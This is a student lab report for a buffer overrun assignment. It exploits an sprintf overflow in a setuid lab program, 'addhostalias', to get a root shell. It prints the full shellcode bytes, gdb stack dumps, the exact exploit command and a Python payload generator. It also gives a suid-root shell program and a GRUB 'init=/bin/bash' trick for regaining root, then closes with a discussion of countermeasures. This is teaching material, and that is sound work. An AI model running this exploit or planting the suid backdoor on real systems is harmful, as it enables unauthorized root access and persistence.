@@ -1,0 +1,234 @@
+TDA602/DIT101 AssignmentsLab 2 - Buffer overruns
+Fire Group-11, Assignemnt 2
+	1. Himanshu Chuphal ( guschuhi@student.gus.se)
+	2. Raya Altarabulsi ( rayyatar@gmail.com )
+______________________________________________________________________________________________________________
+
+Deliverables:
+
+Q1. An explanation of how your exploit gains root access in detail, including memory layout.
+Identification of the Vulnerability, In the given program c file (addhostalias.c), the local var (char formatbuffer[256]), 
+the C program allocates 256 bytes of characters to "formatbuffer", now formatbuffer is allocated using sprintf function, 
+which is the vulnerable part of this program.
+
+ -- sprintf(formatbuffer, "%s\t%s\t%s\n", ip, hostname, alias);
+
+ Here, formatbuffer has array of characters of ip, hostname, alias. However, formatbuffer is only allocated 256 bytes of memmory, which can be overflown through ip, hostname, and alias as no bounds are checked.
+
+ Man page of sprintf:: ( also included as a txt file)
+
+ int
+     sprintf(char * restrict str, const char * restrict format, ...);
+
+The sprintf() and vsprintf() functions are easily misused in a manner which enables malicious users to arbitrarily change a running programs
+functionality through a buffer overflow attack.  Because sprintf() and vsprintf() assume an infinitely long string, callers must be careful not
+to overflow the actual space; this is often hard to assure.
+
+memmory layout ::
+Sizes in x86/IA32 platoform architecture ,
+	1. character - 1 byte, 
+	2. pointers - 4 bytes, 
+	3. return address - 4 bytes 
+	4. saved frame pointer - 4 bytes
+
+Now, If we inspect the vulnerable program addhostalias.c :: ( all in bytes)
+	1. *file  - 4
+	2. formatbuffer - 256
+	3. fp - 4
+	4. ret - 4
+	5. *id - 4
+	6. *hostname - 4  
+	7. *alias -4 
+
+We have 264 bytes to work with, so it takes (256 + 4 + 4 = 264 bytes) to overflow the buffer.
+The program take 3 arguments, If the ip and hostname are 1 byte each, and lets say the shellcode is injected through alias, which gives us 1 + 1 + (262) bytes.
+Now the given shellcode (where we create a bash shell, with root),) - 75 bytes (calulated manually), and the fp is 4 bytes and the return address is 4 bytes.
+262 - 75 - ( 4 + 4) = 179 bytes, thus we have space for 179 NOPS.
+'\x90' is the NOP is an instruction that does nothing, but can be used to gradually lead the program to execute the shellcode.
+
+______________________________________________________________________________________________________________
+Q2. Details on how you created the exploit, including how you found the return address (no bruteforcing).
+
+Steps of how it is done by doing a ssh session to slackr00t VM machine.
+Compile and generate binary:
+dvader@deathstar:~$ gcc -Wall -S -c addhostalias.c -o addhostalias
+
+1. Using gdb with the compiled binary
+	dvader@deathstar:~$ gdb ./addhostalias
+
+2. Breakpoint before running it
+	(gdb) b fopen
+	Breakpoint 1 at 0x8048440
+
+3. run it using python input, Here, it is manipulated as per calulations done before.
+	run "\x90" "\x90" $(python -c 'print "\x90"*179 + "\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"')
+
+	(gdb) run "\x90" "\x90" $(python -c 'print "\x90"*179 + "\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"')
+	 Starting program: /home/dvader/addhostalias "\x90" "\x90" $(python -c 'print "\x90"*179 + "\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"')
+
+
+4. Check registers and addresses using x/100x $sp
+
+	Breakpoint 1, 0x08048440 in fopen ()
+	(gdb) x/100x $sp
+	0xbffffaa0:	0x0804857e	0x080486ec	0x080486ea	0x00000060
+	0xbffffab0:	0xbffffb90	0x4000736f	0x00000000	0x400272c1
+	0xbffffac0:	0x4001432c	0x40007099	0x08048241	0x3039785c
+	0xbffffad0:	0x39785c09	0x90900930	0x90909090	0x90909090
+	0xbffffae0:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbffffaf0:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbffffb00:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbffffb10:	0x90909090	0x90909090	0x90909090	0x90909090 -->
+	0xbffffb20:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbffffb30:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbffffb40:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbffffb50:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbffffb60:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbffffb70:	0x90909090	0x90909090	0x90909090	0x90909090
+	0xbffffb80:	0x90909090	0x90909090	0xffffb990	0xc031ffff
+	0xbffffb90:	0x80cd31b0	0xc031c389	0x80cd46b0	0x32b0c031
+	...
+
+Here, we chose an address somewhat in the beginning of the NOPs (which we could see in the memory by looking for “90” in the address blocks) 
+to ensure that we put the return address before the shellcode in memory. Since the "\x90" or NOP will do nothing and just go to the next instruction 
+until we get to the shell code and executes it.
+
+Looking at gdb output we select, 0xbffffb10 and Using little-endian notation (IA32 has little-endian byte order),
+the address to add to the alias input "\x10\xfb\xff\xbf" 
+
+5. Lets say 4 bytes of the 179 bytes of the overflown buffer are allocated to point to '\x90', then up to 179-4=175,
+   NOP can be used as padding for shellcode at the bottom of the formatbuffer. Re-calulationg address map again - in bytes
+	1. Ip - 1 
+	2. Hostname - 1
+	3. Nops - 175
+	4. shellcode to attack - 75
+	5. return address - 4
+
+6. Running the vulnerable program /usr/bin/addhostalias with root privilages-
+
+/usr/bin/addhostalias "\x90" "\x90" $(python -c 'print "\x90"*175 + "\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" + "\x10\xfb\xff\xbf"')
+
+Output::
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+'<x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" + "\x10\xfb\xff\xbf"')
+sh-2.05a#
+sh-2.05a# whoami
+root
+sh-2.05a# 
+
+do ctrl+D to come out of root shell.
+______________________________________________________________________________________________________________
+
+Q3. Any scripts and/or programs you wrote or used.
+Two scripts were used :
+1. shell script to ssh to deathstar slaclr00t VM 
+KexAlgorithms diffie-hellman-group1-sha1,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1
+ssh-keygen -A needs to be added to /etc/ssh/ssh_config to do ssh to deathstar VM and ssh-keygen -A in my macbook.
+
+2. shellcode.py, modified to to get the malicious string, based on above mentioned calulations
+
+# python code
+shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
+            +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
+            +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
+            +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
+            +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
+            +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
+            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')
+
+#creating attck            
+NOP = ""
+for i in range (0, 175):
+	NOP += '\x90'
+
+ADDR = '\x10\xfb\xff\xbf'
+
+# [NOP].. 175 times [shellcode][ADDR]
+print NOP + shellcode + ADDR
+
+#END
+______________________________________________________________________________________________________________
+
+Q4. Instructions how to regain root access, even without the root password. Clearly, rerunning the exploit is not a valid answer.
+We found 2 ways to do it.
+1. A C Program from http://www.koltsoff.com/pub/getroot/
+
+A simple program to start a root shell if setup correctly with the suid bit and as root owning this file.
+
+#include <unistd.h>	/* setuid, .. */
+#include <sys/types.h>	/* setuid, .. */
+#include <grp.h>	/* setgroups */
+#include <stdio.h>	/* perror */
+
+int main (int argc, char** argv) {
+
+  gid_t newGrp = 0;
+
+  /* this will tattoo the suid bit so that bash won't see that
+     we're not really root. we also drop all other memberships
+     just in case we're running with PAGs (in AFS) */
+  if (setuid(0) != 0) {
+    perror("Setuid failed, no suid-bit set?");
+    return 1;
+  }
+  setgid(0);
+  seteuid(0);
+  setegid(0);
+  /* we also drop all the groups that the old user had
+     (verify with id -tool afterwards)
+     this is not strictly necessary but we want to get rid of the
+     groups that the original user was part of. */
+  setgroups(1, &newGrp);
+  /* load the default shell on top of this program
+     to exit from the shell, use 'exit' :-) */
+  execvp("/bin/bash", argv); 
+
+  return 0;
+}
+
+//end
+
+Alternatively, booting the operating system straight into the root shell. In distributions like ubuntu,  
+it can be done by altering the grub menu during startup ( changing "ro  quiet splash $vt_handoff"  to "rw init=/bin/bash" ) 
+Once the changes are saved, the system will boot straight into root shell from for the administrator. 
+
+______________________________________________________________________________________________________________
+
+Q5. Anything else you think is helpful to reproduce your attack, e.g. ~/.bash_history
+Not much used by us, with ~/.bash_history, it can be used to see previously executed commands, like for running programs with scripts etc.
+
+______________________________________________________________________________________________________________
+
+Q6. What is the shellcode doing?
+As given in assignment page, Some important instructions: 
+"\x31\xc0" //sets real user id from effective user id. 
+
+"\x89\xc3" // copy the value to ebx 
+
+"\xb0\x47" //sets real group id from effective user id.
+
+shellcode.py, modified to to get the malicious string, based on above mentioned calulations.
+
+______________________________________________________________________________________________________________
+
+Q7. Include a comprehensive discussion of countermeasures at language and operating system levels. Give use cases for each countermeasure and 
+   discus how they can be deployed for the scenario of the lab.
+
+   Different use cases are explained below:
+ - Bounds checking (Compiler level): It is a compiler technique that adds run time information about allocated blocks of
+	memory, at run time it will check the pointers against this information and ensures that a variable is of specified type and
+	falls within the defined range before it is being used.
+ - Using safe functions (Programmer level): Major responsibility relies on the Programmer. The programmer needs to be familiar with secure implementations
+	for buffer handling. Use functions that doesn’t allow bufferoverflows, for example using snprintf instead of sprintf since you can specify a bound.
+ 	Use strncat instead of strcat, strncpy instead of strcpy, and so on.
+ - Stack Protector (Compiler level) : It enables a run-time stack overflow verification, protecting against stack overflows.
+ - Non-executable stacks: Making the stack portion of an user process virtual address space non-executable. Thereby making a malicious program introduced onto the stack cannot be executed.
+ - PIE, Position Independent Executables (Compiler Level) : The programs can be build as PIE in order to take advantage of ASLR. PIE make programs slow in terms of performance for x86 systems, 
+ 	but protects users from buffer overflow.
+ - ASLR, Address Space Layout Randomization(Kernel level): It randomizes starting address for various parts of executable eg data, stack and code. 
+ That way it becomes difficult for an hackers to guess which addresses to use in an attack.
+ 
+
+The langauages like C and C++ allows vulnerabilities for different attacks by providing direct access to memory. There here are several protection solutions to help
+coders to avoid buffer overflows in their programs, just that the owner or the programmers need to careful while implementations.
